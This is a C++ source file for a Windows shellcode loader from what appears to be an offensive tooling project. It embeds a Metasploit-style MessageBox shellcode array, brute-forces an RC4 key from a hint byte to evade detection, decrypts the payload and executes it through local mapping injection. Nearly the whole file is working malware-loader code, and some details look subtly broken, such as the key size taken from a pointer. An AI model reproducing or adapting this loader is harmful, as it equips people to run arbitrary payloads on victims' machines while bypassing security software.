
#include <iostream>
#include <string>
#include <Windows.h>
#include <stdio.h>
#include <wininet.h>
#include "../Spells/UtilitySpells/FetchFromURL.h"


#include "../Spells/EncryptionSpells/RC4.h"
#include "../Spells/EncryptionSpells/KeyBrute.h"


#include "../Spells/LocalExecutionSpells/LocalMappingInjection.h"


unsigned char Data_RawData[] = {0xfc, 0x48, 0x81, 0xe4, 0xf0, 0xff, 0xff, 0xff, 0xe8, 0xcc, 0x0, 0x0, 0x0, 0x41, 0x51, 0x41, 0x50, 0x52, 0x48, 0x31, 0xd2, 0x51, 0x56, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0xf, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x2, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0xd, 0x41, 0x1, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x1, 0xd0, 0x66, 0x81, 0x78, 0x18, 0xb, 0x2, 0xf, 0x85, 0x72, 0x0, 0x0, 0x0, 0x8b, 0x80, 0x88, 0x0, 0x0, 0x0, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x1, 0xd0, 0x8b, 0x48, 0x18, 0x50, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x1, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x4d, 0x31, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x1, 0xd6, 0x48, 0x31, 0xc0, 0x41, 0xc1, 0xc9, 0xd, 0xac, 0x41, 0x1, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x3, 0x4c, 0x24, 0x8, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x1, 0xd0, 0x66, 0x41, 0x8b, 0xc, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x1, 0xd0, 0x41, 0x8b, 0x4, 0x88, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x48, 0x1, 0xd0, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x4b, 0xff, 0xff, 0xff, 0x5d, 0xe8, 0xb, 0x0, 0x0, 0x0, 0x75, 0x73, 0x65, 0x72, 0x33, 0x32, 0x2e, 0x64, 0x6c, 0x6c, 0x0, 0x59, 0x41, 0xba, 0x4c, 0x77, 0x26, 0x7, 0xff, 0xd5, 0x49, 0xc7, 0xc1, 0x0, 0x0, 0x0, 0x0, 0xe8, 0x11, 0x0, 0x0, 0x0, 0x48, 0x65, 0x6c, 0x6c, 0x6f, 0x2c, 0x20, 0x66, 0x72, 0x6f, 0x6d, 0x20, 0x4d, 0x53, 0x46, 0x21, 0x0, 0x5a, 0xe8, 0xb, 0x0, 0x0, 0x0, 0x4d, 0x65, 0x73, 0x73, 0x61, 0x67, 0x65, 0x42, 0x6f, 0x78, 0x0, 0x41, 0x58, 0x48, 0x31, 0xc9, 0x41, 0xba, 0x45, 0x83, 0x56, 0x7, 0xff, 0xd5, 0x48, 0x31, 0xc9, 0x41, 0xba, 0xf0, 0xb5, 0xa2, 0x56, 0xff, 0xd5, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}; 


using namespace std;
int main()
{
    PBYTE pPayloadAddress;
    DWORD pPayloadSize;
    string Url = "null";
    LPWSTR szProcessName = L"null";
    DWORD dwProcessID;
    HANDLE hProcess;
    PBYTE InjectionAddress;
    HANDLE hThread;
    HANDLE* phThread = &hThread;

    hThread = GetCurrentThread();
    

    pPayloadSize = sizeof(Data_RawData);
    pPayloadAddress = Data_RawData;


    unsigned char ProtectedKey[] = {
	0x82, 0x5A, 0x84, 0x99, 0x8F, 0xF6, 0x98, 0xC7, 0xD5, 0xD9, 0x21, 0x4A, 0x5B, 0x83, 0x65, 0x59, 
	0xA8, 0xF3, 0x18, 0x68, 0xC4, 0x12, 0xDE, 0x59, 0xA3, 0x30, 0xCA, 0x5E, 0xA5, 0x7D, 0x7F, 0xAE };
    
    #define HINT_BYTE 0xEE
    size_t sKeySize = sizeof(ProtectedKey);
    PBYTE pbKey = (PBYTE)ProtectedKey;
    PBYTE pbRealKey;
    BruteForceDecryption(HINT_BYTE , pbKey, sKeySize, &pbRealKey);
    size_t sRealKeySize = sizeof(pbRealKey);
    Decrypt(pPayloadAddress, pPayloadSize, pbRealKey, sRealKeySize);



    if(!PayloadExecute(hProcess, hThread, pPayloadAddress, (SIZE_T)pPayloadSize, &InjectionAddress, phThread)){
        printf("Failed to execute payload");
        return 0;
    }
   
    // Just for testing purposes (TO REMOVE)
	WaitForSingleObject(*phThread, INFINITE);
    return 0;
}
